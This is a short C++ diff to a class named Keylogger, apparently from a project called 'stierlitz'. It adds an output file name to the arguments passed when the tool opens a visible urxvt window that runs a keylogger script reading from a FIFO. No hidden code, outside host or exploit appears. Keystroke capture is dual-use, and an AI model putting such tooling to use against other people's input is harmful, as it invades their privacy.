@@ -75,7 +75,7 @@ void Keylogger::set_layout(const std::string& __layout) {
 }
 
 void Keylogger::spawn_window() {
-    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), layout_.c_str(), (char*)NULL);
+    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), layout_.c_str(), out_name_.c_str(), (char*)NULL);
 }
 
 void Keylogger::send_dev() {
